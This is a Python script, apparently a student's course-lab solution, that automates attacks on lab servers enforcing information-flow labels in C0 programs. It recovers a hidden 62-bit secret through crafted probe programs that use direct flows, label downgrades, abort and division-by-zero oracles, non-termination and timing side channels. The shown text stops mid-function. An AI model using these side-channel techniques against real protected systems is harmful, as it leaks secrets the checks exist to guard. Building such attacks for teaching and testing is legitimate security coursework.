#!/usr/bin/env python3
"""
Automate Lab 2 Part 1 attacks against c0_serve1..c0_serve5.

Run this on linux.andrew.cmu.edu where the staff binaries are available.
"""

from __future__ import annotations

import argparse
import os
import shlex
import statistics
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

SECRET_BITS = 62
SECRET_MIN = 0
SECRET_MAX_EXCLUSIVE = 1 << SECRET_BITS


DIRECT_FLOW_PROGRAM = """int main(int input, int secret) {
  return secret;
}
"""

DIRECT_LABEL_DOWNGRADE_PROGRAM = """int main(int input, int secret) {
  //@label L;
  int x = secret;
  return x;
}
"""

DIRECT_HIGH_TEMP_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int h = secret;
  return h;
}
"""

DIRECT_ARRAY_HIGH_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int[] A = alloc_array(int, 1);
  A[0] = secret;
  return A[0];
}
"""

DIRECT_ARRAY_LOW_PROGRAM = """int main(int input, int secret) {
  //@label L;
  int[] A = alloc_array(int, 1);
  A[0] = secret;
  return A[0];
}
"""

COMPARE_AS_INT_ORACLE_PROGRAM = """int main(int input, int secret) {
  return secret < input;
}
"""

COMPARE_AS_INT_TMP_ORACLE_PROGRAM = """int main(int input, int secret) {
  int x = secret < input;
  return x;
}
"""

COMPARE_AS_INT_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
  return input <= secret;
}
"""

IMPLICIT_BOOLEAN_PROGRAM = """int main(int input, int secret) {
  int out = 0;
  if (secret < input) {
    out = 1;
  }
  return out;
}
"""

ABORT_ERROR_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    error("leak");
  }
  return 0;
}
"""

ABORT_ASSERT_ORACLE_PROGRAM = """int main(int input, int secret) {
  assert(!(secret < input));
  return 0;
}
"""

ABORT_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  int x = 1;
  if (secret < input) {
    x = x / 0;
  }
  return 0;
}
"""

ABORT_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  int x = 1;
  if (secret < input) {
    x = x % 0;
  }
  return 0;
}
"""

ABORT_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
  int[] A = alloc_array(int, 1);
  int x = 0;
  if (secret < input) {
    x = A[1];
  }
  return 0;
}
"""

EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = (secret < input) && ((1 / 0) == 0);
  return 0;
}
"""

EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = (secret < input) && ((1 % 0) == 0);
  return 0;
}
"""

EXPR_ABORT_AND_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int[] A = alloc_array(int, 1);
  //@label H;
  bool witness = (secret < input) && (A[1] == 0);
  return 0;
}
"""

EXPR_INTCAST_DIV_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int gate = (secret < input);
  //@label H;
  int witness = 1 / gate;
  return 0;
}
"""

EXPR_INTCAST_MOD_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int gate = (secret < input);
  //@label H;
  int witness = 1 % gate;
  return 0;
}
"""

EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int gate = (input <= secret);
  //@label H;
  int witness = 1 / gate;
  return 0;
}
"""

EXPR_INDEX_BOOL_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int[] A = alloc_array(int, 1);
  //@label H;
  bool witness = (A[secret < input] == 0);
  return 0;
}
"""

EXPR_INDEX_BOOL_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int[] A = alloc_array(int, 1);
  //@label H;
  bool witness = (A[input <= secret] == 0);
  return 0;
}
"""

EXPR_DIV_BOOL_CMP_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = ((1 / (secret < input)) == 1);
  return 0;
}
"""

EXPR_MOD_BOOL_CMP_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = ((1 % (secret < input)) == 0);
  return 0;
}
"""

TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    while (true) {
    }
  }
  return 0;
}
"""

TERMINATION_ORACLE_ALT_PROGRAM = """int main(int input, int secret) {
  int stop = 0;
  if (secret < input) {
    while (stop == 0) {
    }
  }
  return 0;
}
"""

NOOP_PROGRAM = """int main(int input, int secret) {
  return 0;
}
"""

VERIFY_INPUT_PROGRAM = """int main(int input, int secret) {
  return input;
}
"""


def make_verify_constant_program(candidate: int) -> str:
    return f"""int main(int input, int secret) {{
  return {candidate};
}}
"""


@dataclass
class QueryResult:
    kind: str
    value: Optional[int]
    elapsed_s: float
    exit_code: Optional[int]
    stdout: str
    stderr: str


class StrategyFailed(Exception):
    pass


def log(msg: str) -> None:
    print(msg, flush=True)


def debug_log(enabled: bool, msg: str) -> None:
    if enabled:
        log(msg)


def parse_server_output(stdout: str, stderr: str) -> tuple[str, Optional[int]]:
    lines: list[str] = []
    if stdout.strip():
        lines.extend(x.strip() for x in stdout.strip().splitlines() if x.strip())
    if stderr.strip():
        lines.extend(x.strip() for x in stderr.strip().splitlines() if x.strip())

    for line in reversed(lines):
        if line.startswith("success "):
            try:
                return "success", int(line.split()[1])
            except Exception:
                return "success", None
        if line.startswith("failure "):
            try:
                return "failure", int(line.split()[1])
            except Exception:
                return "failure", None
        if line in {"error", "abort", "insecure"}:
            return line, None
    if not lines:
        return "no-output", None
    return "unknown", None


def format_result(res: QueryResult) -> str:
    tail = (res.stdout.strip().splitlines()[-1] if res.stdout.strip() else "").strip()
    return (
        f"kind={res.kind} value={res.value} exit={res.exit_code} "
        f"elapsed={res.elapsed_s:.3f}s out={tail!r}"
    )


def run_query(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
) -> QueryResult:
    quoted_user = shlex.quote(userid)
    quoted_program = shlex.quote(str(program_path))
    cmd = f"{server_command} {quoted_user} {quoted_program} {input_value}"
    t0 = time.perf_counter()
    try:
        cp = subprocess.run(
            ["bash", "-lc", cmd],
            text=True,
            capture_output=True,
            timeout=timeout_s,
            check=False,
        )
        elapsed = time.perf_counter() - t0
        kind, value = parse_server_output(cp.stdout, cp.stderr)
        return QueryResult(
            kind=kind,
            value=value,
            elapsed_s=elapsed,
            exit_code=cp.returncode,
            stdout=cp.stdout,
            stderr=cp.stderr,
        )
    except subprocess.TimeoutExpired:
        elapsed = time.perf_counter() - t0
        return QueryResult(
            kind="timeout",
            value=None,
            elapsed_s=elapsed,
            exit_code=None,
            stdout="",
            stderr="",
        )


def estimate_timeout(
    *,
    server_command: str,
    userid: str,
    base_timeout_s: float,
    debug: bool,
) -> float:
    with ProgramFile(NOOP_PROGRAM) as path:
        samples: list[float] = []
        for input_value in (0, SECRET_MAX_EXCLUSIVE):
            for _ in range(2):
                res = run_query(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=input_value,
                    timeout_s=max(base_timeout_s, 1.0),
                )
                if res.kind in {"failure", "success"}:
                    samples.append(res.elapsed_s)
        if not samples:
            estimated = max(base_timeout_s, 2.0)
            debug_log(
                debug,
                f"[calibration] no baseline samples; using timeout {estimated:.2f}s",
            )
            return estimated
        p50 = statistics.median(samples)
        estimated = max(base_timeout_s, min(20.0, p50 * 8.0 + 0.75))
        debug_log(
            debug,
            f"[calibration] baseline median={p50:.4f}s -> timeout {estimated:.2f}s",
        )
        return estimated


class ProgramFile:
    def __init__(self, source: str):
        self.source = source
        self.path: Optional[Path] = None

    def __enter__(self) -> Path:
        fd, raw_path = tempfile.mkstemp(prefix="lab2_attack_", suffix=".c0")
        os.close(fd)
        self.path = Path(raw_path)
        self.path.write_text(self.source, encoding="utf-8")
        return self.path

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        if self.path is not None:
            try:
                self.path.unlink()
            except FileNotFoundError:
                pass


def binary_search_oracle(oracle: Callable[[int], bool]) -> int:
    lo = SECRET_MIN
    hi = SECRET_MAX_EXCLUSIVE
    for _ in range(SECRET_BITS + 2):
        if lo + 1 >= hi:
            break
        mid = (lo + hi) // 2
        if oracle(mid):
            hi = mid
        else:
            lo = mid
    return lo


def verify_secret_candidate(
    *,
    server_command: str,
    userid: str,
    candidate: int,
    timeout_s: float,
) -> bool:
    if candidate < SECRET_MIN or candidate >= SECRET_MAX_EXCLUSIVE:
        return False

    # Preferred verifier: constant return avoids relying on whether a
    # server allows low input to flow to output.
    with ProgramFile(make_verify_constant_program(candidate)) as path:
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=path,
            input_value=0,
            timeout_s=timeout_s,
        )
    if res.kind == "success":
        return True
    if res.kind == "failure":
        return False

    # Fallback verifier for servers that reject huge constants.
    with ProgramFile(VERIFY_INPUT_PROGRAM) as path:
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=path,
            input_value=candidate,
            timeout_s=timeout_s,
        )
    return res.kind == "success"


def verify_nearby_candidates(
    *,
    server_command: str,
    userid: str,
    candidate: int,
    timeout_s: float,
) -> Optional[int]:
    # Binary search on threshold oracles can be off by one if endpoint behavior is odd.
    for guess in (candidate, candidate - 1, candidate + 1):
        if verify_secret_candidate(
            server_command=server_command,
            userid=userid,
            candidate=guess,
            timeout_s=timeout_s,
        ):
            return guess
    return None


def make_bit_abort_oracle_program(*, bit_index: int) -> str:
    divisor = 1 << bit_index
    return f"""int main(int input, int secret) {{
  //@label H;
  int b = (secret / {divisor}) % 2;
  //@label H;
  int witness = 1 / b;
  return 0;
}}
"""


def make_bit_expr_abort_oracle_program(*, bit_index: int, mode: str) -> str:
    divisor = 1 << bit_index
    if mode == "and":
        # With input=2^62 this predicate should be true for all valid secrets.
        guard = "secret < input"
        op = "&&"
    elif mode == "or":
        # Always-false low guard keeps syntax simple while forcing RHS evaluation
        # if the runtime treats || normally.
        guard = "input < input"
        op = "||"
    else:
        raise ValueError(f"unknown mode: {mode}")
    return f"""int main(int input, int secret) {{
  //@label H;
  bool witness = ({guard}) {op} ((1 / ((secret / {divisor}) % 2)) == 1);
  return 0;
}}
"""


def recover_from_bitwise_expr_abort_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    mode: str,
) -> int:
    bits: list[int] = []
    oracle_input = SECRET_MAX_EXCLUSIVE if mode == "and" else 0

    for bit in range(SECRET_BITS):
        source = make_bit_expr_abort_oracle_program(bit_index=bit, mode=mode)
        with ProgramFile(source) as path:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=oracle_input,
                timeout_s=timeout_s,
            )
        if res.kind == "success" and res.value is not None:
            return res.value
        if res.kind == "abort":
            bits.append(0)
            continue
        if res.kind == "failure":
            bits.append(1)
            continue
        raise StrategyFailed(
            f"bitwise expr-{mode} oracle rejected at bit {bit} ({format_result(res)})"
        )

    candidate = sum((bit_val << idx) for idx, bit_val in enumerate(bits))
    verified = verify_nearby_candidates(
        server_command=server_command,
        userid=userid,
        candidate=candidate,
        timeout_s=max(1.0, timeout_s),
    )
    if verified is not None:
        return verified
    raise StrategyFailed(
        f"bitwise expr-{mode} oracle candidate failed final verification"
    )


def recover_from_bitwise_abort_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> int:
    # Build two interpretations and verify by exact match:
    # - abort => bit 0, failure => bit 1
    # - abort => bit 1, failure => bit 0
    abort_map_bits: list[int] = []
    failure_map_bits: list[int] = []

    for bit in range(SECRET_BITS):
        source = make_bit_abort_oracle_program(bit_index=bit)
        with ProgramFile(source) as path:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=0,
                timeout_s=timeout_s,
            )
        if res.kind == "success" and res.value is not None:
            return res.value
        if res.kind == "abort":
            abort_map_bits.append(0)
            failure_map_bits.append(1)
            continue
        if res.kind == "failure":
            abort_map_bits.append(1)
            failure_map_bits.append(0)
            continue
        raise StrategyFailed(
            f"bitwise oracle rejected at bit {bit} ({format_result(res)})"
        )

    candidate_abort0 = sum((bit_val << idx) for idx, bit_val in enumerate(abort_map_bits))
    candidate_abort1 = sum((bit_val << idx) for idx, bit_val in enumerate(failure_map_bits))

    for candidate in (candidate_abort0, candidate_abort1):
        verified = verify_nearby_candidates(
            server_command=server_command,
            userid=userid,
            candidate=candidate,
            timeout_s=max(1.0, timeout_s),
        )
        if verified is not None:
            return verified

    raise StrategyFailed(
        "bitwise abort oracle produced candidates that failed final verification"
    )


def recover_direct(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> int:
    return recover_direct_template(
        server_command=server_command,
        userid=userid,
        timeout_s=timeout_s,
        program_source=DIRECT_FLOW_PROGRAM,
        strategy_name="direct flow",
    )


def recover_direct_template(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
    strategy_name: str,
) -> int:
    with ProgramFile(program_source) as path:
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=path,
            input_value=0,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            return res.value
        raise StrategyFailed(f"{strategy_name} unavailable ({format_result(res)})")


def recover_from_failure_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
) -> int:
    with ProgramFile(program_source) as path:
        def classify(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind == "failure" and res.value in (0, 1):
                return res.value == 1
            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")

        boundary_lo = classify(SECRET_MIN)
        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
        if boundary_lo == boundary_hi:
            raise StrategyFailed(
                "boolean-oracle boundary check failed "
                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
            )
        if (not boundary_lo) and boundary_hi:
            return binary_search_oracle(classify)
        return binary_search_oracle(lambda mid: not classify(mid))


def recover_from_kind_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
    true_kinds: set[str],
    false_kinds: set[str],
) -> int:
    with ProgramFile(program_source) as path:
        def classify(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind in true_kinds:
                return True
            if res.kind in false_kinds:
                return False
            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")

        boundary_lo = classify(SECRET_MIN)
        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
        if boundary_lo == boundary_hi:
            raise StrategyFailed(
                "kind-oracle boundary check failed "
                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
            )
        if (not boundary_lo) and boundary_hi:
            return binary_search_oracle(classify)
        return binary_search_oracle(lambda mid: not classify(mid))


def recover_from_strict_expr_abort_suite(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> int:
    probes = [
        ("&& div0", EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM),
        ("&& mod0", EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM),
        ("&& oob", EXPR_ABORT_AND_OOB_ORACLE_PROGRAM),
    ]
    last_error = "strict expr-abort suite did not produce a usable oracle"
    for probe_name, source in probes:
        try:
            return recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=timeout_s,
                program_source=source,
                true_kinds={"abort"},
                false_kinds={"failure"},
            )
        except StrategyFailed as e:
            msg = str(e)
            # If the first strict probe always aborts for both endpoints, the
            # rest of this family tends to be equally non-informative.
            if "boundary check failed (at 0 => True, at 2^62 => True)" in msg:
                raise StrategyFailed(
                    f"strict expr-abort probes non-informative ({probe_name} always-abort endpoints)"
                ) from e
            last_error = f"{probe_name}: {msg}"
    raise StrategyFailed(last_error)


def make_strict_expr_fuzz_program(
    *,
    guard: str,
    op: str,
    payload: str,
    payload_first: bool,
    needs_array: bool,
) -> str:
    lhs = payload if payload_first else guard
    rhs = guard if payload_first else payload
    array_decl = ""
    if needs_array:
        array_decl = """  //@label H;
  int[] A = alloc_array(int, 1);
"""
    return f"""int main(int input, int secret) {{
{array_decl}  //@label H;
  bool witness = ({lhs}) {op} ({rhs});
  return 0;
}}
"""


def iter_strict_expr_fuzz_programs() -> list[tuple[str, str]]:
    guards = [
        ("s-lt-i", "(secret < input)"),
        ("i-le-s", "(input <= secret)"),
        ("s-eq-i", "(secret == input)"),
        ("not-s-lt-i", "(!(secret < input))"),
        ("i-eq-i", "(input == input)"),
        ("i-lt-i", "(input < input)"),
    ]
    payloads = [
        ("div0", "((1 / 0) == 0)", False),
        ("mod0", "((1 % 0) == 0)", False),
        ("oob-a1", "(A[1] == 0)", True),
        ("oob-inp1", "(A[(input - input) + 1] == 0)", True),
        ("bit-div2", "((1 / ((secret / 2) % 2)) == 1)", False),
        ("bit-div4", "((1 / ((secret / 4) % 2)) == 1)", False),
    ]
    out: list[tuple[str, str]] = []
    for guard_name, guard in guards:
        for payload_name, payload, needs_array in payloads:
            for op in ("&&", "||"):
                for payload_first in (False, True):
                    order_name = "payload-first" if payload_first else "guard-first"
                    name = f"{guard_name}-{op}-{payload_name}-{order_name}"
                    src = make_strict_expr_fuzz_program(
                        guard=guard,
                        op=op,
                        payload=payload,
                        payload_first=payload_first,
                        needs_array=needs_array,
                    )
                    out.append((name, src))
    return out


def recover_from_strict_expr_fuzz_suite(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    debug: bool,
    max_probes: int = 64,
) -> int:
    programs = iter_strict_expr_fuzz_programs()
    tested = 0
    informative = 0
    no_signal_streak = 0
    for name, source in programs:
        if tested >= max_probes:
            break
        tested += 1
        with ProgramFile(source) as path:
            res_lo = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=SECRET_MIN,
                timeout_s=timeout_s,
            )
            res_hi = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=SECRET_MAX_EXCLUSIVE,
                timeout_s=timeout_s,
            )
        if res_lo.kind == "success" and res_lo.value is not None:
            return res_lo.value
        if res_hi.kind == "success" and res_hi.value is not None:
            return res_hi.value

        # Informative kind oracle candidate
        if (
            res_lo.kind in {"abort", "failure"}
            and res_hi.kind in {"abort", "failure"}
            and res_lo.kind != res_hi.kind
        ):
            informative += 1
            no_signal_streak = 0
            debug_log(
                debug,
                f"[strict-fuzz] informative kind probe {name}: "
                f"lo={res_lo.kind} hi={res_hi.kind}",
            )
            try:
                return recover_from_kind_oracle(
                    server_command=server_command,
                    userid=userid,
                    timeout_s=timeout_s,
                    program_source=source,
                    true_kinds={res_hi.kind},
                    false_kinds={res_lo.kind},
                )
            except StrategyFailed:
                pass

        # Informative boolean-oracle candidate
        if (
            res_lo.kind == "failure"
            and res_hi.kind == "failure"
            and res_lo.value in {0, 1}
            and res_hi.value in {0, 1}
            and res_lo.value != res_hi.value
        ):
            informative += 1
            no_signal_streak = 0
            debug_log(
                debug,
                f"[strict-fuzz] informative bool probe {name}: "
                f"lo={res_lo.value} hi={res_hi.value}",
            )
            try:
                return recover_from_failure_oracle(
                    server_command=server_command,
                    userid=userid,
                    timeout_s=timeout_s,
                    program_source=source,
                )
            except StrategyFailed:
                pass

        # Fast-fail in strict mode when many probes yield no endpoint signal.
        no_signal_streak += 1
        if tested >= 24 and no_signal_streak >= 24:
            break

    raise StrategyFailed(
        f"strict expr-fuzz found no usable oracle (tested={tested}, informative={informative})"
    )


def make_strict_bitwise_div_template(*, divisor: int, variant: str) -> str:
    if variant == "and-inline":
        return f"""int main(int input, int secret) {{
  //@label H;
  bool witness = (input == input) && ((1 / ((secret / {divisor}) % 2)) == 1);
  return 0;
}}
"""
    if variant == "or-inline":
        return f"""int main(int input, int secret) {{
  //@label H;
  bool witness = (input < input) || ((1 / ((secret / {divisor}) % 2)) == 1);
  return 0;
}}
"""
    if variant == "and-temp":
        return f"""int main(int input, int secret) {{
  //@label H;
  int b = (secret / {divisor}) % 2;
  //@label H;
  bool witness = (input == input) && ((1 / b) == 1);
  return 0;
}}
"""
    if variant == "or-temp":
        return f"""int main(int input, int secret) {{
  //@label H;
  int b = (secret / {divisor}) % 2;
  //@label H;
  bool witness = (input < input) || ((1 / b) == 1);
  return 0;
}}
"""
    if variant == "int-temp":
        return f"""int main(int input, int secret) {{
  //@label H;
  int b = (secret / {divisor}) % 2;
  //@label H;
  int witness = 1 / b;
  return 0;
}}
"""
    raise ValueError(f"unknown bitwise template variant: {variant}")


def recover_from_strict_bitwise_templates(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    debug: bool,
) -> int:
    variants = ["and-inline", "or-inline", "and-temp", "or-temp", "int-temp"]
    last_error = "strict bitwise templates found no usable oracle"

    for variant in variants:
        bits: list[int] = []
        ok = True
        for bit in range(SECRET_BITS):
            src = make_strict_bitwise_div_template(divisor=(1 << bit), variant=variant)
            with ProgramFile(src) as path:
                res = run_query(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=0,
                    timeout_s=timeout_s,
                )
            if res.kind == "success" and res.value is not None:
                return res.value
            if res.kind == "abort":
                bits.append(0)
                continue
            if res.kind == "failure":
                bits.append(1)
                continue

            ok = False
            last_error = f"{variant} rejected at bit {bit} ({format_result(res)})"
            debug_log(debug, f"[strict-bitwise] {last_error}")
            break

        if not ok:
            continue

        candidate = sum((bit_val << idx) for idx, bit_val in enumerate(bits))
        verified = verify_nearby_candidates(
            server_command=server_command,
            userid=userid,
            candidate=candidate,
            timeout_s=max(1.0, timeout_s),
        )
        if verified is not None:
            debug_log(debug, f"[strict-bitwise] accepted template {variant}")
            return verified
        last_error = f"{variant} produced candidate failing verification"
        debug_log(debug, f"[strict-bitwise] {last_error}")

    raise StrategyFailed(last_error)


def median_runtime_for_input(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
    repeats: int,
) -> float:
    runtimes: list[float] = []
    for _ in range(repeats):
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=program_path,
            input_value=input_value,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            raise StrategyFailed(f"already solved directly: {res.value}")
        if res.kind != "failure":
            raise StrategyFailed(f"timing probe rejected ({format_result(res)})")
        runtimes.append(res.elapsed_s)
    return statistics.median(runtimes)


def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
    return f"""int main(int input, int secret) {{
  int warmup = 0;
  while (warmup < {warmup_iters}) {{
    warmup = warmup + 1;
  }}
  //@label H;
  int burn = 0;
  if (secret < input) {{
    while (burn < {burn_iters}) {{
      burn = burn + 1;
    }}
  }}
  return 0;
}}
"""


def make_short_circuit_timing_program(*, term_count: int) -> str:
    # Use input-dependent (non-constant-foldable) arithmetic terms so the true path
    # does measurable work even under aggressive simplification.
    terms = []
    for i in range(term_count):
        mod_base = 97 + (i % 61)
        terms.append(f"((input % {mod_base}) == (input % {mod_base}))")
    heavy = " && ".join(terms) if terms else "true"
    return f"""int main(int input, int secret) {{
  //@label H;
  bool burn = (secret < input) && ({heavy});
  return 0;
}}
"""


def make_array_alloc_timing_program(*, scale: int, mod_base: int) -> str:
    # Attempt a checker-bypass timing channel where both branches are expression-only,
    # but runtime work differs due to alloc_array size. No explicit loops/assignments.
    return f"""int main(int input, int secret) {{
  //@label H;
  int[] A = alloc_array(int, (((input % {mod_base}) + {mod_base}) % {mod_base} + 1) * ({scale}));
  //@label H;
  bool burn = (secret < input) && (\\length(A) >= 0);
  return 0;
}}
"""


def recover_from_timing_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    repeats: int,
    debug: bool,
    verify_timeout_s: float,
) -> int:
    def timing_input_for(mid: int, candidate_name: str) -> int:
        if candidate_name.startswith("alloc-timing-"):
            # Avoid huge allocation sizes during boundary/binary-search probes, while
            # preserving monotonic ordering of attacker inputs.
            max_safe_input = 1 << 20
            if mid <= SECRET_MIN:
                return 0
            if mid >= SECRET_MAX_EXCLUSIVE:
                return max_safe_input
            mapped = (mid * max_safe_input) // SECRET_MAX_EXCLUSIVE
            return max(1, mapped)
        return mid

    calibration_repeats = max(5, repeats)
    burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
    sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
    alloc_timing_candidates = [(2000, 1021), (4000, 1021), (8000, 509)]
    min_ratio = 1.03
    min_gap_s = 0.0020
    min_boundary_consistency = 0.80

    candidates: list[tuple[str, str]] = []
    for burn in burn_candidates:
        candidates.append(
            (
                f"loop-burn={burn}",
                make_timing_oracle_program(warmup_iters=1_000_000, burn_iters=burn),
            )
        )
    for term_count in sc_term_candidates:
        candidates.append(
            (
                f"short-circuit-terms={term_count}",
                make_short_circuit_timing_program(term_count=term_count),
            )
        )
    for scale, mod_base in alloc_timing_candidates:
        candidates.append(
            (
                f"alloc-timing-scale={scale}-mod={mod_base}",
                make_array_alloc_timing_program(scale=scale, mod_base=mod_base),
            )
        )

    last_failure = "no timing candidates worked"
    skip_remaining_loop_burn = False
    for candidate_name, source in candidates:
        if skip_remaining_loop_burn and candidate_name.startswith("loop-burn="):
            continue
        with ProgramFile(source) as path:
            try:
                t_false = median_runtime_for_input(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=timing_input_for(SECRET_MIN, candidate_name),
                    timeout_s=timeout_s,
                    repeats=calibration_repeats,
                )
                t_true = median_runtime_for_input(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=timing_input_for(SECRET_MAX_EXCLUSIVE, candidate_name),
                    timeout_s=timeout_s,
                    repeats=calibration_repeats,
                )
            except StrategyFailed as e:
                last_failure = str(e)
                debug_log(debug, f"[timing] {candidate_name}: {last_failure}")
                if candidate_name.startswith("loop-burn=") and "kind=insecure" in last_failure:
                    skip_remaining_loop_burn = True
                continue

            ratio = t_true / max(t_false, 1e-9)
            gap = t_true - t_false
            debug_log(
                debug,
                f"[timing] {candidate_name}: baseline={t_false:.4f}s true={t_true:.4f}s "
                f"ratio={ratio:.3f} gap={gap:.4f}s",
            )
            if ratio < min_ratio or gap < min_gap_s:
                last_failure = (
                    f"insufficient separation for {candidate_name} "
                    f"(ratio={ratio:.3f}, gap={gap:.4f}s)"
                )
                continue

            threshold = (t_false + t_true) / 2.0

            # Dynamic cost control: some candidates (especially allocation-based ones)
            # can become very expensive during boundary voting / binary search.
            classify_repeats = max(2, min(3, repeats))
            votes_total = 2
            boundary_checks = 5
            if ratio >= 1.12 and gap >= 0.010:
                classify_repeats = 1
                votes_total = 1
                boundary_checks = 3
            elif ratio >= 1.08 and gap >= 0.005:
                classify_repeats = max(1, repeats // 2)
                votes_total = 1
                boundary_checks = 3
            debug_log(
                debug,
                f"[timing] {candidate_name}: classify-repeats={classify_repeats} "
                f"votes={votes_total} boundary-checks={boundary_checks}",
            )

            def classify(mid: int) -> bool:
                mapped_mid = timing_input_for(mid, candidate_name)
                votes_true = 0
                for _ in range(votes_total):
                    t_mid = median_runtime_for_input(
                        server_command=server_command,
                        userid=userid,
                        program_path=path,
                        input_value=mapped_mid,
                        timeout_s=timeout_s,
                        repeats=classify_repeats,
                    )
                    if t_mid > threshold:
                        votes_true += 1
                # ceil(votes_total / 2)
                return votes_true * 2 >= votes_total

            def boundary_vote(mid: int, checks: int) -> tuple[bool, float]:
                true_count = 0
                for _ in range(checks):
                    if classify(mid):
                        true_count += 1
                frac_true = true_count / checks
                if frac_true >= 0.5:
                    return True, frac_true
                return False, 1.0 - frac_true

            boundary_lo, conf_lo = boundary_vote(SECRET_MIN, boundary_checks)
            boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE, boundary_checks)

            if (
                candidate_name.startswith("alloc-timing-")
                and ratio >= 1.12
                and gap >= 0.010
                and (
                conf_lo < min_boundary_consistency
                or conf_hi < min_boundary_consistency
                or boundary_lo == boundary_hi
                )
            ):
                # Fallback for noisy alloc-timing probes: scan for a stable local
                # sign change in mapped input space, then classify against that.
                max_safe_input = 1 << 20
                grid = [0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512]
                grid += [1024, 2048, 4096, 8192, 16384, 32768]
                grid += [65536, 131072, 262144, 524288, 786432, max_safe_input]

                point_truth: dict[int, bool] = {}
                point_conf: dict[int, float] = {}
                for x in grid:
                    val, conf = boundary_vote(x, 3)
                    point_truth[x] = val
                    point_conf[x] = conf

                bracket: Optional[tuple[int, int]] = None
                for left, right in zip(grid, grid[1:]):
                    if (
                        point_truth[left] != point_truth[right]
                        and point_conf[left] >= min_boundary_consistency
                        and point_conf[right] >= min_boundary_consistency
                    ):
                        bracket = (left, right)
                        break

                if bracket is not None:
                    left, right = bracket
                    left_val = point_truth[left]
                    right_val = point_truth[right]
                    debug_log(
                        debug,
                        f"[timing] {candidate_name}: local bracket [{left}, {right}] "
                        f"({left_val}->{right_val})",
                    )

                    def mapped_classify(mapped_input: int) -> bool:
                        mapped_input = max(0, min(max_safe_input, mapped_input))
                        votes_true = 0
                        for _ in range(votes_total):
                            t_mid = median_runtime_for_input(
                                server_command=server_command,
                                userid=userid,
                                program_path=path,
                                input_value=mapped_input,
                                timeout_s=timeout_s,
                                repeats=classify_repeats,
                            )
                            if t_mid > threshold:
                                votes_true += 1
                        return votes_true * 2 >= votes_total

                    def mapped_to_secret_guess(mapped_input: int) -> int:
                        return (mapped_input * SECRET_MAX_EXCLUSIVE) // max_safe_input

                    # Binary search in mapped space first.
                    lo_m = left
                    hi_m = right
